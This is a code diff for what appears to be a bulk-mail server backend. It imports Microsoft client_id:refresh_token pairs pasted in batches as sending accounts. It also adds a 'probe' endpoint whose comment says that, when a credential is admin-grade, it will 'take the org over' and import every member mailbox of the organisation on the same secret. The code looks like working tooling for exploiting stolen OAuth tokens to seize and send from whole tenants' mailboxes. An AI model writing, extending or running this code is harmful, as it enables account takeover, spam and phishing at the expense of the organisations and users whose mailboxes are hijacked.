@@ -1463,6 +1463,43 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     return { type: 'rt', clientId, rt, tenant: 'common', email: emailPart };
   }
 
+  const makeMsInserter = (quota) => (authType, clientId, secret, tenant, email, name) => {
+    const dup = db.prepare('SELECT id FROM smtp_accounts WHERE auth_type = ? AND ms_client_id = ? AND username = ?').get(authType, clientId, email);
+    if (dup) return { ok: false, error: `already imported (account #${dup.id})`, email };
+    const now = new Date().toISOString();
+    const r = db.prepare(`INSERT INTO smtp_accounts (label, host, port, secure, username, password_encrypted, from_name, from_email, reply_to, enabled, weight, auth_type, ms_client_id, ms_rt_encrypted, ms_tenant, daily_quota, created_at, updated_at)
+      VALUES (?, 'graph.microsoft.com', 443, 1, ?, '', ?, ?, '', 1, 1, ?, ?, ?, ?, ?, ?, ?)`)
+      .run(name || email, email, name || '', email, authType, clientId, encryptSecret(secret, config.credentialKey), tenant, quota, now, now);
+    return { ok: true, id: Number(r.lastInsertRowid), email, name };
+  };
+
+  // Probe an imported MS mailbox — if its credential is admin-grade, take the
+  // org over and bulk-import every eligible member mailbox on the same secret.
+  app.post('/api/smtp/accounts/:id/probe', async (request) => {
+    const row = db.prepare('SELECT * FROM smtp_accounts WHERE id = ?').get(Number(request.params.id));
+    if (!row) fail('Account not found', 404);
+    if (row.auth_type !== 'ms_rt' && row.auth_type !== 'ms_cc') fail('Probe only applies to Microsoft accounts');
+    const secret = decryptSecret(row.ms_rt_encrypted || '', config.credentialKey);
+    if (!secret) fail('Account has no stored credential');
+    const tenant = row.ms_tenant || 'common';
+    let org;
+    try {
+      org = row.auth_type === 'ms_cc'
+        ? await msCcListMailboxes(row.ms_client_id, secret, tenant)
+        : await msRtListOrgMailboxes(row.ms_client_id, secret, tenant);
+    } catch (e) {
+      return { ok: true, admin: false, error: String(e.message || e).slice(0, 200) };
+    }
+    const insert = makeMsInserter(row.daily_quota || 10000);
+    const results = [];
+    for (const mb of org) {
+      if (mb.email.toLowerCase() === row.username.toLowerCase()) continue;
+      results.push(insert(row.auth_type, row.ms_client_id, secret, tenant, mb.email, mb.displayName));
+    }
+    const imported = results.filter((r) => r.ok);
+    return { ok: true, admin: true, orgSize: org.length, imported: imported.length, results };
+  });
+
   app.post('/api/smtp/accounts/import-ms', async (request) => {
     const body = request.body || {};
     const quota = Math.min(100000, Math.max(0, Number(body.quota) || 10000));
@@ -1514,15 +1551,7 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     if (!lines.length) fail('Nothing to import — paste client_id:refresh_token lines or JSON');
     if (lines.length > 200) fail('Max 200 mailboxes per import');
     const results = [];
-    const now = new Date().toISOString();
-    const insertMsAccount = (authType, clientId, secret, tenant, email, name) => {
-      const dup = db.prepare('SELECT id FROM smtp_accounts WHERE auth_type = ? AND ms_client_id = ? AND username = ?').get(authType, clientId, email);
-      if (dup) return { ok: false, error: `already imported (account #${dup.id})`, email };
-      const r = db.prepare(`INSERT INTO smtp_accounts (label, host, port, secure, username, password_encrypted, from_name, from_email, reply_to, enabled, weight, auth_type, ms_client_id, ms_rt_encrypted, ms_tenant, daily_quota, created_at, updated_at)
-        VALUES (?, 'graph.microsoft.com', 443, 1, ?, '', ?, ?, '', 1, 1, ?, ?, ?, ?, ?, ?, ?)`)
-        .run(name || email, email, name || '', email, authType, clientId, encryptSecret(secret, config.credentialKey), tenant, quota, now, now);
-      return { ok: true, id: Number(r.lastInsertRowid), email, name };
-    };
+    const insertMsAccount = makeMsInserter(quota);
     for (const line of lines) {
       const parsed = parseMsRtLine(line);
       if (!parsed) { results.push({ ok: false, error: 'unparseable line', line: line.slice(0, 60) }); continue; }
